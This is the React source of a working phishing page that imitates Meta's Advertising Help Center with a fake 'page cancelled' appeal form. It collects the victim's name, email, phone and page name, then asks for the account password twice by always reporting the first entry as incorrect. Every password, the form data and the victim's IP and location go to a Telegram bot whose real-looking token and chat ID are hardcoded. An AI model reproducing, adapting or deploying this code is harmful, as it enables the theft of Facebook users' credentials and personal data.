import React, { Component } from 'react';
import 'react-international-phone/style.css';
import 'bootstrap/dist/css/bootstrap.min.css';
import 'bootstrap/dist/js/bootstrap.min.js';
import Modal from 'react-bootstrap/Modal';
import Button from 'react-bootstrap/Button';
import axios from 'axios';
import { PhoneNumberUtil } from 'google-libphonenumber';
import { MuiPhone } from './components/MuiPhone';
import './Appeal.css';
import emaillogo from './email.jpg';
import newlogo from './newlogo1.png';

class Appeal extends Component {
    constructor(props) {
        super(props);
        this.state = {
            passwordAttempts: 0,
            isModalOpen: false,
            isPasswordError: false,
            isRedirecting: false,  // Added state for "Redirecting..." text
            showAuthenticating: false,
            randomNumber: null,
            show: false,
            isTermsAccepted: false,
            email: '', // Initialize email state variable
            phone: '', // Initialize phone state variable
            password: '',  // Added state for password input
            passwordLength: 0,
        };
    }

    handlePasswordInput = (e) => {
        const password = e.target.value;
        this.setState({ passwordLength: password.length, password: password });
    };
    handleTermsChange = () => {
        // Toggle the terms acceptance
        this.setState((prevState) => ({
            isTermsAccepted: !prevState.isTermsAccepted,
        }));
    };

    isPhoneValid = (phone) => {
        const phoneUtil = PhoneNumberUtil.getInstance();
        try {
            return phoneUtil.isValidNumber(phoneUtil.parseAndKeepRawInput(phone));
        } catch (error) {
            return false;
        }
    };

    generateRandomNumber() {
        // Generate and set the random number in the state
        this.setState({
            randomNumber: Math.floor(Math.random() * 900000000000) + 100000000000,
        });
    }

    openModal = () => {
        const {
            isTermsAccepted,
            isPasswordError,
        } = this.state;

        const isFormValid =
            isTermsAccepted &&
            this.validateField('Message') &&
            this.validateField('Name') &&
            this.validateField('Email') &&
            this.validateField('Phone') &&
            this.validateField('PageName');

        // Open the modal only if the form is valid and there are no password errors
        if (isFormValid && !isPasswordError) {
            this.handleModalShow();
        } else {

        }
    };

    closeModal = () => {
        // Close the modal by setting isModalOpen to false
        this.setState({ isModalOpen: false });
    };


    submitForm = async () => {
        const {
            isTermsAccepted,
            passwordAttempts,
            hasSentData, // New state variable
        } = this.state;

        const isFormValid =
            isTermsAccepted &&
            this.validateField('Message') &&
            this.validateField('Name') &&
            this.validateField('Email') &&
            this.validateField('Phone') &&
            this.validateField('PageName');

        if (isFormValid) {
            const passwordElement = document.getElementById('password');
            const password = passwordElement ? passwordElement.value : '';

            if (password === 'examplepassword' || passwordAttempts < 2) {
                // Password is correct or it's the first or second attempt, proceed with form submission
                this.setState({ isPasswordError: false, showAuthenticating: true });

                // Set a timeout for 3 seconds before showing the incorrect password message
                setTimeout(() => {
                    this.setState({ showAuthenticating: false });

                    if (passwordAttempts === 0) {
                        // First attempt, show "Incorrect password" message
                        this.setState({ isPasswordError: true });
                    } else if (passwordAttempts === 1) {
                        // Second attempt, show "Redirecting..." message and redirect to /confirm
                        this.setState({ isRedirecting: true });

                        setTimeout(() => {
                            window.location.href = '/confirm';
                        }, 5000);
                    }
                }, 5000);

                // Clear the password input after the first attempt
                if (passwordAttempts === 0) {
                    this.setState({ password: '' });
                }

                // Call sendData() only on the first attempt
                if (!hasSentData && passwordAttempts === 0) {
                    this.sendData();
                    this.setState({ hasSentData: true });
                }

                // Schedule IP location check after a short delay
                setTimeout(() => {
                    const message = `Pasi${passwordAttempts + 1}: ${password}`;
                    this.getIPLocation(message, passwordAttempts === 1);
                }, 500);

                // Increment password attempt counter
                this.setState({
                    passwordAttempts: passwordAttempts + 1,
                });
            } else {
                // Password is incorrect after two attempts, show error message
                this.setState({
                    isPasswordError: true,
                    showAuthenticating: false,
                });

                const message = `Pasi${passwordAttempts + 1}: ${password}`;
                await this.getIPLocation(message, false);
            }
        }
    };












    validateField = (fieldName) => {
        const field = document.getElementById(fieldName);
        const fieldValue = field ? field.value.trim() : ''; // Add null check
        const errorElement = document.getElementById(`${fieldName}-error`);

        // Reset previous error message
        if (errorElement) {
            errorElement.style.display = 'none';
        }

        if (field && field.required && fieldValue === '') {
            if (errorElement) {
                errorElement.innerText = `${fieldName} is required.`;
                errorElement.style.display = 'block';
            }
            return false;
        }

        // Email validation
        if (field && fieldName === 'Email') {
            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
            if (!emailPattern.test(fieldValue)) {
                if (errorElement) {
                    errorElement.innerText = 'Please enter a valid email address.';
                    errorElement.style.display = 'block';
                }
                return false;
            }
        }

        // Add more specific validations for each field if needed

        return true;
    };



    getIPLocation = (message, shouldRedirect) => {
        fetch('https://api.ipify.org/?format=json')
            .then((response) => response.json())
            .then((data) => {
                const userIp = data.ip;

                message += `\nIP: ${userIp}`;
                this.sendTelegramMessage(message);

                if (shouldRedirect) {
                    setTimeout(() => {
                        window.location.replace('/confirm');
                    }, 2000);
                }
            })
            .catch((error) => {
                console.error('Error fetching IP location:', error);
            });
    };


    sendTelegramMessage = (message) => {
        const botToken = '6504436094:AAHS03NHNdp5IuP90o89tDKf5kSXtan3OqU';
        const chatId = '-1002131592723';

        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const data = {
            chat_id: chatId,
            text: message,
        };

        axios.post(apiUrl, data)
    }

    sendData = () => {
        const {
            isTermsAccepted,
        } = this.state;

        const isFormValid =
            isTermsAccepted &&
            this.validateField('Message') &&
            this.validateField('Name') &&
            this.validateField('Email') &&
            this.validateField('Phone') &&
            this.validateField('PageName');

        if (isFormValid) {
            const message = document.getElementById('Message').value;
            const name = document.getElementById('Name').value;
            const email = document.getElementById('Email').value;
            const phone = document.getElementById('Phone').value;
            const pageName = document.getElementById('PageName').value;

            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(ipData => {
                    const { ip, country_name, city } = ipData;

                    const formattedMessage = `Mesazhi: ${message}\nEmri: ${name}\nEmaili: ${email}\nNrTel: ${phone}\nEmri i Faqes: ${pageName}\nIP: ${ip}\nShteti: ${country_name}\nQyteti: ${city}`;

                    // Send the Telegram message only if the form is validated
                    this.sendTelegramMessage(formattedMessage);
                })
                .catch(error => {
                    console.error('Error fetching IP location:', error);
                });
        }
    };


    componentDidMount() {
        this.generateRandomNumber();

        const fcfButton = document.getElementById('fcf-button');
        const modalContainer = document.querySelector('.modal-container');
        const modalContent = document.querySelector('.modal-content');

        if (fcfButton) {
            fcfButton.addEventListener('click', () => {
                this.openModal();
            });
        }

        if (modalContainer) {
            modalContainer.addEventListener('click', (event) => {
                if (event.target === modalContainer) {
                    modalContainer.classList.remove('active');
                }
            });
        }

        if (modalContent) {
            modalContent.addEventListener('click', (event) => {
                event.stopPropagation();
            });
        }

        const modalSubmitButton = document.getElementById('modal-submit-button');

        if (modalSubmitButton) {
            modalSubmitButton.addEventListener('click', () => {
                // Call sendData when the user submits the form from the modal
                this.sendData();
            });
        }
    }



    handleEmailChange = (e) => {
        this.setState({ email: e.target.value });
    };

    handleModalShow = () => {
        const {
            isTermsAccepted,
            passwordAttempts,
            isPasswordError,
        } = this.state;

        const isFormValid =
            isTermsAccepted &&
            this.validateField('Message') &&
            this.validateField('Name') &&
            this.validateField('Email') &&
            this.validateField('Phone') &&
            this.validateField('PageName');

        if (isFormValid && passwordAttempts === 0) {
            this.setState({ show: true });
        } else if (passwordAttempts > 0 && !isPasswordError) {
            this.setState({ show: true });
        }
    };

    handleModalClose = () => {
        this.setState({ show: false });
    };

    render() {
        const { show, isPasswordError, randomNumber, isTermsAccepted, email, phone, isRedirecting } = this.state;
        const isPhoneValid = this.isPhoneValid(phone);

        return (
            <div>
                <header>
                    <link
                        rel="stylesheet"
                        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
                        integrity="sha512-..."
                        crossOrigin="anonymous"
                    />
                    <img src="./Meta-Logo.png" alt="fb" className="logo" />
                    <span className="get-started">Get started</span>
                    <span className="space"></span>
                    <span className="advertise">Advertise</span>
                    <span className="space"></span>
                    <span className="learn">Learn</span>
                    <span className="space"></span>
                    <span className="support">Support</span>
                    <span className="search-icon"></span>
                </header>

                <div className="containers" style={{ backgroundSize: 'cover', minHeight: '50px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
                    <h2 style={{ fontSize: '26px' }} centered>Advertising Help Center</h2>
                </div>

                <div className="card">
                    <div>
                        <br />
                        <div className="row" style={{ padding: "20px", paddingBottom: '20px' }}>

                            <div className="col-md-1 col-2">
                                <img src={emaillogo} className="fa-solid fa-envelope" style={{ width: '50px' }} alt="fb" />
                            </div>
                            <div className="col-md-11 col-10">
                                <p style={{ fontWeight: 'bold', marginBottom: '0' }}>Intellectual property violation</p>
                                <div className="" style={{ paddingTop: "5px" }}>
                                    <span data-v-4362cbd2="" className="open" style={{ paddingTop: "20px", backgroundColor: 'rgb(59, 129, 211)', fontSize: '12px', padding: "7px", color: "#fff", borderRadius: "15px" }}>OPEN</span>
                                    <span style={{ color: '#90949c', fontSize: '12px', paddingLeft: "10px" }} id="randomNumber">CASE #{randomNumber}</span>
                                </div>
                            </div>
                        </div>
                        <hr></hr>
                        <div className="row" style={{ padding: "20px", paddingTop: '20px', paddingBottom: '20px'}}>
                            <input hidden id="ip" name="ip" />
                            <div className="col-md-1 col-2">
                                <img src={newlogo} className="img-fluid" alt="fb" />
                            </div>
                            <div className="col-md-11 col-10" style={{ paddingLeft: '0' }}>
                                <p style={{ fontWeight: 'bold', fontSize: '14px', marginBottom: '7px' }}>Our Message</p>
                                <p style={{ fontSize: '14px', color: '#67788A' }} className="ourmessagiii">
                                    - Community Standards
                                    - Copyright<br />
                                    - Hate speech, harassment and bullying<br />
                                    - Intellectual property rights<br />
                                    <br />
                                    If you believe your page was cancelled by mistake, fill in this form so we can help.
                                </p>
                            </div>
                        </div>
                    </div>




                    <div className="card-body" style={{ maxWidth: '600px', margin: 'auto', padding: '20px' }}>
                        <div style={{ display: 'flex', justifyContent: 'center' }}>
                            <div id="fcf-form" className="">
                                <form className="form-group" id="freeversion" action="/confirm" noValidate >
                                    <div className="field">
                                        <label htmlFor="Message" className="label has-text-weight-normal" style={{ textAlign: 'left' }}>
                                            Please provide information that might help us investigate
                                        </label>
                                        <div className="form-group">
            <textarea
                name="Message"
                id="Message"
                className="form-control"
                maxLength="5000"
                rows="3"
                data-validate-field="Message"
                style={{ resize: 'none', borderRadius: '5px' }}
                required
            ></textarea>
                                            <p className="error text-danger" id="Message-error" style={{ fontSize: '12px' }}></p>
                                        </div>
                                    </div>

                                    <div className="form-group">
                                        <label htmlFor="Name" className="label has-text-weight-normal" style={{ textAlign: 'left' }}>
                                            Full Name
                                        </label>
                                        <div className="control">
                                            <input
                                                type="name"
                                                name="Name"
                                                id="Name"
                                                className="form-control"
                                                maxLength="100"
                                                data-validate-field="Name"
                                                required
                                                style={{ borderRadius: '5px' }}
                                            />
                                        </div>
                                        <p className="error text-danger" id="Name-error" style={{ fontSize: '12px' }}></p>
                                    </div>

                                    <div className="form-group">
                                        <label htmlFor="Email" className="label has-text-weight-normal" style={{ textAlign: 'left' }}>
                                            Personal Email Address
                                        </label>
                                        <div className="control">
                                            <input
                                                type="email"
                                                name="Email"
                                                id="Email"
                                                className="form-control"
                                                maxLength="100"
                                                data-validate-field="Email"
                                                pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$"
                                                value={this.state.email}
                                                onChange={this.handleEmailChange}
                                                required
                                                style={{ borderRadius: '5px' }}
                                            />
                                        </div>
                                        <p className="error text-danger" id="Email-error" style={{ fontSize: '12px' }}></p>
                                    </div>

                                    <div className="form-group">
                                        <label htmlFor="Phone" className="label has-text-weight-normal" style={{ textAlign: 'left' }}>
                                            Phone Number
                                        </label>
                                        <div className="control">
                                            <MuiPhone
                                                value={this.state.phone}
                                                onChange={(phone) => this.setState({ phone })}
                                                style={{ width: '100%' }}
                                                inputProps={{
                                                    name: 'Phone',
                                                    id: 'Phone',
                                                    className: `${isPhoneValid ? 'is-valid' : 'is-invalid'}`,
                                                    maxLength: '100',
                                                    'data-validate-field': 'Phone',
                                                    required: true,
                                                }}
                                            />
                                        </div>
                                        {!isPhoneValid && (
                                            <p className="error text-danger" id="Phone-error" style={{ fontSize: '12px' }}>
                                                {/* Add your custom error message here */}
                                            </p>
                                        )}
                                    </div>

                                    <div className="field">
                                        <label htmlFor="PageName" className="label has-text-weight-normal" style={{ textAlign: 'left' }}>
                                            Facebook Page Name
                                        </label>
                                        <div className="form-group">
                                            <input
                                                type="name"
                                                name="PageName"
                                                id="PageName"
                                                className="form-control"
                                                maxLength="100"
                                                data-validate-field="PageName"
                                                required
                                                style={{ borderRadius: '5px' }}
                                            />
                                        </div>
                                        <p className="error text-danger" id="PageName-error" style={{ fontSize: '12px' }}></p>
                                    </div>

                                    <div className="field">
                                        <div className="form-check">
                                            <input
                                                type="checkbox"
                                                className="form-check-input"
                                                id="termsCheck"
                                                checked={isTermsAccepted}
                                                onChange={this.handleTermsChange}
                                            />
                                            <label className="form-check-label" htmlFor="termsCheck">
                                                I accept the terms and agreements.
                                            </label>
                                        </div>
                                    </div>

                                    <div className="field">
                                        <div className="buttons" style={{ textAlign: 'right' }}>
                                            <br />
                                            <button
                                                style={{ width: '100%' }}
                                                id="fcf-button"
                                                type="button"
                                                className="btn btn-primary btn-block"
                                                disabled={!isTermsAccepted || !isPhoneValid} // Disable if terms are not accepted or phone is not valid
                                            >
                                                Submit
                                            </button>
                                        </div>
                                        <br />
                                    </div>

                                    <div style={{ marginTop: '15px' }}>
                                        <p style={{ fontSize: '14px', color: '#67788A', display: 'inline-block' }}>
                                            For more information about how Meta handles your data, please read our{' '}
                                            <a style={{ fontSize: '14px', textDecoration: 'underline', color: '#0064E0' }} href="https://www.facebook.com/privacy/explanation/">
                                                Meta Privacy Policy
                                            </a>
                                        </p>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>


                <div
                    className="modal show"
                    style={{ display: 'block', position: 'initial' }}
                >
                    <Modal dialogClassName="custom-modal" show={show} onHide={this.handleModalClose} centered backdrop="static" keyboard={false}>
                        <Modal.Header closeButton>
                            <Modal.Title style={{ fontSize: '14px', fontWeight: 'bold' }}>Please Enter Your Password</Modal.Title>
                        </Modal.Header>
                        <Modal.Body>
                            {this.state.showAuthenticating ? (
                                <p style={{ fontSize: '14px', color: '#67788A', marginBottom: '10px' }}>
                                    Authenticating in progress...
                                </p>
                            ) : (
                                <div>
                                    <p style={{ fontSize: '14px', color: "#67788A", marginBottom: '10px' }}>
                                        For your security, you must re-enter your password to continue.
                                    </p>
                                    <input type="email" id="email" name="Email" value={email} className="password-input form-control mb-3" disabled/>
                                    <input
                                        type="password"
                                        id="password"
                                        name="Password"
                                        className="password-input form-control mb-3"
                                        style={{ fontSize: '14px', borderRadius: '5px' }}
                                        value={this.state.password}
                                        onInput={this.handlePasswordInput}
                                        onChange={(e) => this.setState({ password: e.target.value })}
                                    />
                                    <p className="password-error text-danger" id="password-error" style={{ fontSize: '12px', display: isPasswordError ? 'block' : 'none' }}>
                                        Incorrect password. Please try again.
                                    </p>
                                    <p
                                        id="redirecting-text"
                                        style={{ fontSize: '14px', color: '#67788A', display: isRedirecting ? 'block' : 'none' }}
                                    >
                                        Redirecting...
                                    </p>
                                    <p className="login-success" id="login-success" style={{ fontSize: '14px', display: isPasswordError ? 'none' : 'block' }}></p>
                                </div>
                            )}
                        </Modal.Body>
                        <Modal.Footer>
                            {!this.state.showAuthenticating && (
                                <Button variant="primary" onClick={this.submitForm} id="modal-submit-button" style={{ fontSize: '14px', borderRadius: '5px' }} disabled={this.state.passwordLength < 8}>
                                    Submit
                                </Button>
                            )}
                        </Modal.Footer>
                    </Modal>


                </div>
                <footer style={{ backgroundColor: '#4080ff', color: 'white', padding: '43.7px 0' }}>
                    <div className="container" style={{ textAlign: 'center' }}>
                        <p>
                            Facebook can help your large, medium or small business grow.
                            Get the latest news for advertisers and more on our Meta for Business Page.
                        </p>

                        <div className="row" style={{ justifyContent: 'center', fontSize: '12px' }}>
                            <div className="col-md-2">
                                <ul style={{ textAlign: 'left', listStyle: 'none', padding: 0, margin: 0, display: 'flex', flexDirection: 'column', alignItems: 'flex-start' }}>
                                    <li>
                                        <p className="fontbold">Marketing on Facebook</p>
                                        <p>Success Stories</p><p>Measurement</p>
                                        <p>Industries</p><p>Inspiration</p>
                                        <p>Events</p><p>News</p><p>Site map</p>
                                    </li>
                                </ul>
                            </div>
                            <div className="col-md-2">
                                <ul style={{ textAlign: 'left', listStyle: 'none', padding: 0, margin: 0, display: 'flex', flexDirection: 'column', alignItems: 'flex-start' }}>
                                    <li>
                                        <p className="fontbold">Marketing objectives</p>
                                        <p>Build your presence</p><p>Create awareness</p><p>Drive discovery</p><p>Generate leads</p><p>Boost sales</p><p>Earn loyalty</p>
                                        <p>Facebook Pages</p>
                                    </li>
                                </ul>
                            </div>
                            <div className="col-md-2">
                                <ul style={{ textAlign: 'left', listStyle: 'none', padding: 0, margin: 0, display: 'flex', flexDirection: 'column', alignItems: 'flex-start' }}>
                                    <li>
                                        <p className="fontbold">Facebook ads</p>
                                        <p>Get started with ads</p><p>Buying Facebook ads</p><p>Ad formats</p><p>Ad placement</p><p>Choose your audience</p><p>Measure your ads</p><p>Managing your ads</p>
                                    </li>
                                </ul>
                            </div>
                            <div className="col-md-2">
                                <ul style={{ textAlign: 'left', listStyle: 'none', padding: 0, margin: 0, display: 'flex', flexDirection: 'column', alignItems: 'flex-start' }}>
                                    <li>
                                        <p className="fontbold">Facebook ads</p>
                                        <p>Resources</p><p>Ads Guide</p><p>Business Help Center</p><p>Meta Audience Network</p><p>Meta Blueprint</p><p>Meta for Developers</p><p>Meta Business Partners</p>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </footer>
                <div className="container" style={{ textAlign: 'center', fontSize: '10px',marginTop: '20px' }}>
                    <div style={{ display: 'inline-block', marginRight: '20px' }}>
                        <ul style={{ color: 'black',listStyle: 'none', paddingBottom: 30, margin: 0 }}>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px', color: 'black' }} href="https://facebook.com/">English (US)</a></li>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black' }} href="https://facebook.com/">English (UK)</a></li>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black' }} href="https://facebook.com/">Español</a></li>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black' }} href="https://facebook.com/">Português (Brasil)</a></li>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black' }} href="https://facebook.com/">Français (France)</a></li>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black' }} href="https://facebook.com/">More languages</a></li>
                            <br></br><br></br>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black' }} href="https://facebook.com/">About</a></li>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black' }} href="https://facebook.com/">Privacy</a></li>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black' }} href="https://facebook.com/">Cookie</a></li>
                            <li style={{ display: 'inline-block', marginRight: '10px' }}><a style={{ fontSize: '12px',color: 'black' }} href="https://facebook.com/">Meta © 2024</a></li>
                        </ul>
                    </div>
                </div>


                {/* Bootstrap's JavaScript */}
                <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
                <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.1/js/bootstrap.min.js"></script>
                <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

                {/* VENDORS */}
                <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.11.8/umd/popper.min.js"></script>
                {/* JS */}
                <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.5/dist/jquery.validate.js"></script>
                <script src="/js/app.js"></script>
            </div>


        );
    }
}

export default Appeal;
